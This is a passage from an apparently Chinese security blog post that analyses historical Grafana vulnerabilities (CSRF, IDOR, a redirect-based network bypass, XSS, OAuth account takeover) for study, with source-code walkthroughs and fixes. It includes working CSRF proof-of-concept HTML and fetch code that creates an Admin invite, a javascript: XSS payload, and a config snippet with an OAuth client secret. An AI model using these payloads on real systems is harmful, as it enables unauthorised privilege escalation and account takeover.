function_">csrf</span>(<span class="string">&quot;attacker&quot;</span>, <span class="string">&quot;attacker@example.com&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="漏洞分析-4"><a href="#漏洞分析-4" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>从<a href="https://github.com/grafana/grafana/security/advisories/GHSA-cmf4-h3xc-jw8w">官方通告</a>就可以得知是邀请功能处的CSRF，即<a href="http://127.0.0.1:3000/org/users/invite">http://127.0.0.1:3000/org/users/invite</a>  ，但我在测试时发现Grafana的Cookie的SameSite属性是Lax，即跨站POST请求是不会带Cookie的，所以直接放弃了<code>POST /api/org/invites</code>这个接口，我觉得这里是不会有CSRF漏洞的，然后接着找邀请功能是否有请求方法为GET的接口，也尝试了Method Override，但都无果。最后只能搜公开POC，于是找到文章 <a href="https://jub0bs.com/posts/2022-02-08-cve-2022-21703-writeup/">CVE-2022-21703: cross-origin request forgery against Grafana</a></p>
<p>文章中对这个漏洞的利用有个前提就是POC所在地址和Grafana<strong>同站</strong>，这一点确实是没有想到，有点觉得同站才能攻击甚至都不算漏洞。不过我从文章里还是学到很多东西。</p>
<p>如果已经在同站的前提下，那么我第一步构造的POC会是这样：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://127.0.0.1:3000/api/org/invites&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;text/plain&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;<span class="symbol">&amp;#123;</span><span class="symbol">&amp;quot;</span>name<span class="symbol">&amp;quot;</span><span class="symbol">&amp;#58;</span><span class="symbol">&amp;quot;</span>test<span class="symbol">&amp;quot;</span><span class="symbol">&amp;#44;</span><span class="symbol">&amp;quot;</span>email<span class="symbol">&amp;quot;</span><span class="symbol">&amp;#58;</span><span class="symbol">&amp;quot;</span><span class="symbol">&amp;quot;</span><span class="symbol">&amp;#44;</span><span class="symbol">&amp;quot;</span>role<span class="symbol">&amp;quot;</span><span class="symbol">&amp;#58;</span><span class="symbol">&amp;quot;</span>Admin<span class="symbol">&amp;quot;</span><span class="symbol">&amp;#44;</span><span class="symbol">&amp;quot;</span>sendEmail<span class="symbol">&amp;quot;</span><span class="symbol">&amp;#58;</span>false<span class="symbol">&amp;#44;</span><span class="symbol">&amp;quot;</span>loginOrEmail<span class="symbol">&amp;quot;</span><span class="symbol">&amp;#58;</span><span class="symbol">&amp;quot;</span>test<span class="symbol">&amp;#46;</span>com<span class="symbol">&amp;quot;</span><span class="symbol">&amp;#125;</span>&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      history.<span class="title function_">pushState</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>实际发出的请求包如下：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/org/invites</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:3000</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://127.0.0.1:8080</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/plain</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://127.0.0.1:8080/</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>grafana_session=0ddf59e56f25e8815da0e1d2c937ab44</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>88</span><br><span class="line"></span><br><span class="line"><span class="language-actionscript">&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;test&quot;</span>,<span class="string">&quot;email&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;role&quot;</span>:<span class="string">&quot;Admin&quot;</span>,<span class="string">&quot;sendEmail&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;loginOrEmail&quot;</span>:<span class="string">&quot;test.com&quot;</span>&#125;=</span></span><br><span class="line"><span class="language-actionscript"></span></span><br></pre></td></tr></table></figure>

<p>返回包是：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">415</span> Unsupported Media Type</span><br><span class="line">...</span><br><span class="line">[&#123;&quot;classification&quot;:&quot;ContentTypeError&quot;,&quot;message&quot;:&quot;Unsupported Content-Type&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>观察发现请求包的Json数据最后面多了一个<code>=</code>，但其实这是没影响的，服务端对Json的处理有一定程度的容错，这种case我曾经在其他漏洞赏金计划中发现过。真正导致利用失败的是<code>Content-Type: text/plain</code>，显然服务端期望的是Json，但是通过form表单提交数据的话，是无法设置<code>application/x-www-form-urlencoded</code>，<code>multipart/form-data</code>和<code>text/plain</code>以外的Content-Type的</p>
<p>改用Fetch，并设置Content-Type：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> data = &#123; <span class="string">&quot;name&quot;</span>: <span class="string">&quot;test&quot;</span>, <span class="string">&quot;email&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;role&quot;</span>: <span class="string">&quot;Admin&quot;</span>, <span class="string">&quot;sendEmail&quot;</span>: <span class="literal">true</span>, <span class="string">&quot;loginOrEmail&quot;</span>: <span class="string">&quot;test.com&quot;</span> &#125;;</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">fetch</span>(<span class="string">&#x27;http://127.0.0.1:3000/api/org/invites&#x27;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">credentials</span>: <span class="string">&quot;include&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">headers</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data)</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230810185059372.png" alt="image-20230810185059372"></p>
<p>由于使用了自定义的请求头（Content-Type非<code>application/x-www-form-urlencoded</code>，<code>multipart/form-data</code>和<code>text/plain</code>），该请求就不是简单请求，那么就会触发预检请求，Grafana没有配置CORS，因此CORS预检将会失败，浏览器永远不会发送实际请求。</p>
<p>我们可以将请求变成简单请求的同时在Content-Type中走私其他内容：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> data = &#123; <span class="string">&quot;name&quot;</span>: <span class="string">&quot;test&quot;</span>, <span class="string">&quot;email&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;role&quot;</span>: <span class="string">&quot;Admin&quot;</span>, <span class="string">&quot;sendEmail&quot;</span>: <span class="literal">true</span>, <span class="string">&quot;loginOrEmail&quot;</span>: <span class="string">&quot;test.com&quot;</span> &#125;;</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">fetch</span>(<span class="string">&#x27;http://127.0.0.1:3000/api/org/invites&#x27;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">credentials</span>: <span class="string">&quot;include&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">headers</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;text/plain; application/json&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data)</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230810190826535.png" alt="image-20230810190826535"></p>
<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230810190839995.png" alt="image-20230810190839995"></p>
<p>这里虽然显示被同源策略阻止，但其实请求已经发送，阻止的只是响应数据的读取</p>
<p>Grafana接受<code>text/plain; application/json</code>为Json是因为 pkg&#x2F;macaron&#x2F;binding&#x2F;binding.go:43</p>
<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230810191929462.png" alt="image-20230810191929462"></p>
<h3 id="漏洞修复-5"><a href="#漏洞修复-5" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>发现8.3.5并未解决这个漏洞，7.5.15已经修复，下面调试用的8.4.0</p>
<p>pkg&#x2F;api&#x2F;org_invite.go:34</p>
<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230813104842663.png" alt="image-20230813104842663"></p>
<p>pkg&#x2F;web&#x2F;binding.go:16，这里使用了go的标准库进行解析</p>
<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230813105116764.png" alt="image-20230813105116764"></p>
<h2 id="CVE-2022-21713（Teams-API-IDOR）"><a href="#CVE-2022-21713（Teams-API-IDOR）" class="headerlink" title="CVE-2022-21713（Teams API IDOR）"></a>CVE-2022-21713（Teams API IDOR）</h2><h3 id="影响范围-6"><a href="#影响范围-6" class="headerlink" title="影响范围"></a>影响范围</h3><p><strong>Affected versions</strong>: &gt;&#x3D; 5.0.0-beta1<br><strong>Patched versions</strong>: 8.3.5、7.5.15</p>
<h3 id="漏洞复现-6"><a href="#漏洞复现-6" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>参考<a href="https://github.com/grafana/grafana/security/advisories/GHSA-63g3-9jq3-mccv">CVE-2022-21713：Grafana Teams API IDOR</a>，在登录之后（Viewer或Editor权限都行），可通过以下接口获取本无权访问的数据</p>
<ul>
<li><code>/api/teams/search</code></li>
<li><code>/api/teams/:teamId</code></li>
<li><code>/api/teams/:teamId/members</code>（需要设置<code>editors_can_admin</code>为true）</li>
</ul>
<h3 id="漏洞分析-5"><a href="#漏洞分析-5" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>版本8.3.4，teams相关接口定义：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">r.Group(<span class="string">&quot;/api&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(apiRoute routing.RouteRegister)</span></span> &#123;</span><br><span class="line">...</span><br><span class="line">  <span class="comment">// team (admin permission required)</span></span><br><span class="line">  apiRoute.Group(<span class="string">&quot;/teams&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(teamsRoute routing.RouteRegister)</span></span> &#123;</span><br><span class="line">    teamsRoute.Post(<span class="string">&quot;/&quot;</span>, bind(models.CreateTeamCommand&#123;&#125;), routing.Wrap(hs.CreateTeam))</span><br><span class="line">    teamsRoute.Put(<span class="string">&quot;/:teamId&quot;</span>, bind(models.UpdateTeamCommand&#123;&#125;), routing.Wrap(hs.UpdateTeam))</span><br><span class="line">    teamsRoute.Delete(<span class="string">&quot;/:teamId&quot;</span>, routing.Wrap(hs.DeleteTeamByID))</span><br><span class="line">    teamsRoute.Get(<span class="string">&quot;/:teamId/members&quot;</span>, routing.Wrap(hs.GetTeamMembers))</span><br><span class="line">    teamsRoute.Post(<span class="string">&quot;/:teamId/members&quot;</span>, bind(models.AddTeamMemberCommand&#123;&#125;), routing.Wrap(hs.AddTeamMember))</span><br><span class="line">    teamsRoute.Put(<span class="string">&quot;/:teamId/members/:userId&quot;</span>, bind(models.UpdateTeamMemberCommand&#123;&#125;), routing.Wrap(hs.UpdateTeamMember))</span><br><span class="line">    teamsRoute.Delete(<span class="string">&quot;/:teamId/members/:userId&quot;</span>, routing.Wrap(hs.RemoveTeamMember))</span><br><span class="line">    teamsRoute.Get(<span class="string">&quot;/:teamId/preferences&quot;</span>, routing.Wrap(hs.GetTeamPreferences))</span><br><span class="line">    teamsRoute.Put(<span class="string">&quot;/:teamId/preferences&quot;</span>, bind(dtos.UpdatePrefsCmd&#123;&#125;), routing.Wrap(hs.UpdateTeamPreferences))</span><br><span class="line">  &#125;, reqCanAccessTeams)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// team without requirement of user to be org admin</span></span><br><span class="line">  apiRoute.Group(<span class="string">&quot;/teams&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(teamsRoute routing.RouteRegister)</span></span> &#123;</span><br><span class="line">    teamsRoute.Get(<span class="string">&quot;/:teamId&quot;</span>, routing.Wrap(hs.GetTeamByID))</span><br><span class="line">    teamsRoute.Get(<span class="string">&quot;/search&quot;</span>, routing.Wrap(hs.SearchTeams))</span><br><span class="line">  &#125;)</span><br><span class="line">...</span><br><span class="line">&#125;, reqSignedIn)</span><br></pre></td></tr></table></figure>

<p>所有接口都要求reqSignedIn，即已登录。<code>/api/teams/:teamId/members</code> 接口还需要reqCanAccessTeams，代码在pkg&#x2F;middleware&#x2F;auth.go:136</p>
<h4 id="api-teams-search"><a href="#api-teams-search" class="headerlink" title="&#x2F;api&#x2F;teams&#x2F;search"></a>&#x2F;api&#x2F;teams&#x2F;search</h4><p>pkg&#x2F;api&#x2F;team.go:88</p>
<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230814143154837.png" alt="image-20230814143154837"></p>
<p><code>EditorsCanAdmin</code>是需要在配置文件中设置的，默认是false，所以默认情况下，不管我们的角色是不是Admin，userIdFilter都是0，然后传入SearchTeamsQuery这个结构体，然后通过BUS机制调用具体的查询数据的逻辑：</p>
<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230814143540414.png" alt="image-20230814143540414"></p>
<p>具体代码在 pkg&#x2F;services&#x2F;sqlstore&#x2F;team.go:175</p>
<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230814145312250.png" alt="image-20230814145312250"></p>
<p>断点处的判断很关键，如果进入的是<code>query.UserIdFilter &gt; 0</code>这个分支，那么最终的SQL语句将会有user_id的相关查询和判断，最终拼接出的SQL语句如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">		team.id <span class="keyword">as</span> id,</span><br><span class="line">		team.org_id,</span><br><span class="line">		team.name <span class="keyword">as</span> name,</span><br><span class="line">		team.email <span class="keyword">as</span> email, (<span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">FROM</span> team_member <span class="keyword">WHERE</span> team_member.team_id <span class="operator">=</span> team.id) <span class="keyword">AS</span> member_count  <span class="keyword">FROM</span> team <span class="keyword">as</span> team  <span class="keyword">WHERE</span> team.org_id <span class="operator">=</span> ? <span class="keyword">order</span> <span class="keyword">by</span> team.name <span class="keyword">asc</span> LIMIT <span class="number">1000</span> <span class="keyword">OFFSET</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>可以看到并未对用户权限或者所属team做判断，可以理解为0是一个特权id，有所有team的权限。</p>
<p>如果进入另一个分支，那么SQL语句如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">		team.id <span class="keyword">AS</span> id,</span><br><span class="line">		team.org_id,</span><br><span class="line">		team.name <span class="keyword">AS</span> name,</span><br><span class="line">		team.email <span class="keyword">AS</span> email,</span><br><span class="line">		team_member.permission, (<span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">FROM</span> team_member <span class="keyword">WHERE</span> team_member.team_id <span class="operator">=</span> team.id) <span class="keyword">AS</span> member_count  <span class="keyword">FROM</span> team <span class="keyword">AS</span> team</span><br><span class="line">		<span class="keyword">INNER</span> <span class="keyword">JOIN</span> team_member <span class="keyword">ON</span> team.id <span class="operator">=</span> team_member.team_id <span class="keyword">AND</span> team_member.user_id <span class="operator">=</span> ?  <span class="keyword">WHERE</span> team.org_id <span class="operator">=</span> ? <span class="keyword">order</span> <span class="keyword">by</span> team.name <span class="keyword">asc</span> LIMIT <span class="number">1000</span> <span class="keyword">OFFSET</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>这样如果用户不在这个team，将不会查询到数据</p>
<h4 id="api-teams-teamId"><a href="#api-teams-teamId" class="headerlink" title="&#x2F;api&#x2F;teams&#x2F;:teamId"></a>&#x2F;api&#x2F;teams&#x2F;:teamId</h4><p>pkg&#x2F;api&#x2F;team.go:129</p>
<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230814150134984.png" alt="image-20230814150134984"></p>
<p>然后到pkg&#x2F;services&#x2F;sqlstore&#x2F;team.go:238</p>
<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230814150301338.png" alt="image-20230814150301338"></p>
<p>这个接口并未对用户做任何归属或者权限校验</p>
<h4 id="api-teams-teamId-members"><a href="#api-teams-teamId-members" class="headerlink" title="&#x2F;api&#x2F;teams&#x2F;:teamId&#x2F;members"></a>&#x2F;api&#x2F;teams&#x2F;:teamId&#x2F;members</h4><p>先看reqCanAccessTeams，pkg&#x2F;middleware&#x2F;auth.go:136</p>
<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230814151114476.png" alt="image-20230814151114476"></p>
<p>只有当角色不是Admin并且enabled为False的时候才会accessForbidden，当前我们是Viewer，而这里的enabled其实是EditorsCanAdmin这项配置，见pkg&#x2F;api&#x2F;api.go:32</p>
<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230814151412462.png" alt="image-20230814151412462"></p>
<p>所以这里的权限验证就通过了，后面查询的具体逻辑在：pkg&#x2F;services&#x2F;sqlstore&#x2F;team.go:402</p>
<h3 id="漏洞修复-6"><a href="#漏洞修复-6" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a href="https://github.com/grafana/grafana/commit/254f19c70376286f0dc627b2d95c7f5cc63a8153">https://github.com/grafana/grafana/commit/254f19c70376286f0dc627b2d95c7f5cc63a8153</a></p>
<h2 id="CVE-2022-29170（Network-restrictions-bypass）"><a href="#CVE-2022-29170（Network-restrictions-bypass）" class="headerlink" title="CVE-2022-29170（Network restrictions bypass）"></a>CVE-2022-29170（Network restrictions bypass）</h2><h3 id="影响范围-7"><a href="#影响范围-7" class="headerlink" title="影响范围"></a>影响范围</h3><p><strong>Affected versions</strong>: &gt;7.4<br><strong>Patched versions</strong>: 7.5.16、8.5.3</p>
<h3 id="漏洞复现-7"><a href="#漏洞复现-7" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>该漏洞影响的是企业版，参考 <a href="https://grafana.com/grafana/download?platform=docker">https://grafana.com/grafana/download?platform=docker</a> 运行指定版本</p>
<p>复现比较简单，参照 <a href="https://grafana.com/docs/grafana/latest/setup-grafana/configure-security/configure-request-security/#request-security">request-security</a> 配置黑白名单，然后添加一个Prometheus数据源，控制URL返回重定向，即可绕过安全策略</p>
<h3 id="漏洞修复-7"><a href="#漏洞修复-7" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a href="https://github.com/grafana/grafana/pull/49240/files">https://github.com/grafana/grafana/pull/49240/files</a></p>
<p>其实还有其他方法可以绕过这个安全策略，已经提交官方了（CVE-2023-4399）</p>
<h2 id="CVE-2022-31097（XSS-—-a标签href）"><a href="#CVE-2022-31097（XSS-—-a标签href）" class="headerlink" title="CVE-2022-31097（XSS — a标签href）"></a>CVE-2022-31097（XSS — a标签href）</h2><h3 id="影响范围-8"><a href="#影响范围-8" class="headerlink" title="影响范围"></a>影响范围</h3><p><strong>Affected versions</strong>: &lt; 9.0.3, &lt; 8.5.9, &lt; 8.4.10, &lt; 8.3.10, &gt;&#x3D;8.0<br><strong>Patched versions</strong>: 9.0.3, 8.5.9, 8.4.10, 8.3.10</p>
<h3 id="漏洞复现-8"><a href="#漏洞复现-8" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>创建Alert rule，设置<code>Runbook URL</code>为<code>javascript:alert(1)</code>，对应显示界面会渲染为a标签的href属性，点击即可触发XSS</p>
<h3 id="漏洞修复-8"><a href="#漏洞修复-8" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a href="https://github.com/grafana/grafana/pull/52238/files#diff-691394a56baf1c8cb3534abb9530db44e1329d6f0bd8866049404848779bd13c">https://github.com/grafana/grafana/pull/52238/files#diff-691394a56baf1c8cb3534abb9530db44e1329d6f0bd8866049404848779bd13c</a></p>
<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230818104252049.png" alt="image-20230818104252049"></p>
<p>用@braintree&#x2F;sanitize-url 的 sanitizeUrl 处理</p>
<h2 id="CVE-2022-31107（OAuth-账号接管）"><a href="#CVE-2022-31107（OAuth-账号接管）" class="headerlink" title="CVE-2022-31107（OAuth 账号接管）"></a>CVE-2022-31107（OAuth 账号接管）</h2><h3 id="影响范围-9"><a href="#影响范围-9" class="headerlink" title="影响范围"></a>影响范围</h3><p><strong>Affected versions</strong>: &lt; 9.0.3, &lt; 8.5.9, &lt; 8.4.10, &lt; 8.3.10, &gt;&#x3D; 5.3<br><strong>Patched versions</strong>: 9.0.3, 8.5.9, 8.4.10, 8.3.10</p>
<h3 id="漏洞复现-9"><a href="#漏洞复现-9" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d -p3000:3000 grafana/grafana:8.5.6</span><br></pre></td></tr></table></figure>

<p>根据<a href="https://github.com/grafana/grafana/security/advisories/GHSA-mx47-6497-3fv2">官方描述</a>，应该是所有类型的OAuth认证都存在账户接管问题，参考<a href="https://grafana.com/docs/grafana/v8.5/auth/github/">官方文档</a>配置GitHub OAuth2。</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[auth.github]</span></span><br><span class="line"><span class="attr">enabled</span> = <span class="literal">true</span></span><br><span class="line"><span class="attr">allow_sign_up</span> = <span class="literal">true</span></span><br><span class="line"><span class="attr">client_id</span> = c89de4b541aeb0979995</span><br><span class="line"><span class="attr">client_secret</span> = <span class="number">8</span>bf5ec52ff1e92b382bac983232631205781bf2c</span><br><span class="line"><span class="attr">scopes</span> = user:email,read:org</span><br><span class="line"><span class="attr">auth_url</span> = https://github.com/login/oauth/authorize</span><br><span class="line"><span class="attr">token_url</span> = https://github.com/login/oauth/access_token</span><br><span class="line"><span class="attr">api_url</span> = https://api.github.com/user</span><br><span class="line"><span class="attr">allowed_domains</span> =</span><br><span class="line"><span class="attr">team_ids</span> =</span><br><span class="line">allowed_organizations =</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230819165912200.png" alt="image-20230819165912200"></p>
<p>然后首先登录admin，创建一个和OAuth服务用户用户名相同，邮箱地址不同的账号，这里我创建和我github账号同名的用户<code>l3yx</code>，</p>
<p>用OAuth登录，将会接管原本的<code>l3yx</code>账户</p>
<p>当然正常的攻击方式是修改自己的OAuth对应服务的用户名，使其和Grafana中某个账户Username相同（或使用目标帐户的电子邮件作为用户名），以此接管指定账户</p>
<h3 id="漏洞分析-6"><a href="#漏洞分析-6" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>可以先看一下OAuth的原理和实例：<a href="https://www.ruanyifeng.com/blog/2019/04/github-oauth.html">GitHub OAuth 第三方登录示例教程</a>。Grafana 8.5.x 的版本前端代码一直编译不成功，所以调试用了8.4.7 的版本</p>
<p>依然先创建用户和配置OAuth登录：</p>
<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230820095531878.png" alt="image-20230820095531878"></p>
<p>在pkg&#x2F;api&#x2F;login_oauth.go:72下断点，然后通过OAuth github登录</p>
<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230820100810077.png" alt="image-20230820100810077"></p>
<p>这里通过传入的参数”github”动态获取provider以及connect，然后计算一些参数，到pkg&#x2F;api&#x2F;login_oauth.go:142 生成跳转到github的链接</p>
<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230820101238644.png" alt="image-20230820101238644"></p>
<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230820101324704.png" alt="image-20230820101324704"></p>
<p>用户在Github同意授权后，GitHub 就会重定向回Grafana，同时携带一个授权码：</p>
<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230820101706481.png" alt="image-20230820101706481"></p>
<p>断点再次到pkg&#x2F;api&#x2F;login_oauth.go:72，不过这次多了”code”和”state”参数，由于”code”参数，这次程序进入另一个if分支：</p>
<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230820102114401.png" alt="image-20230820102114401"></p>
<p>这里将URL中的state参数和ClientSecret进行运算后，与Cookie中的oauth_state进行比较，如果不同的话就会报错，而这里的Cookie中的oauth_state源自于第一次请求&#x2F;login&#x2F;github时，用随机串和ClientSecret运算生成的</p>
<p>state校验通过后，会动态获取对应的oauthClient：</p>
<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230820102817109.png" alt="image-20230820102817109"></p>
<p>继续到pkg&#x2F;api&#x2F;login_oauth.go:191，这里使用授权码向GitHub请求Token</p>
<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230820103226886.png" alt="image-20230820103226886"></p>
<p>然后我第一次调试到这里，会有error，可能是调试时间太长导致授权码过期了，第二次调试直接断到Token获取这里</p>
<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230820103720312.png" alt="image-20230820103720312"></p>
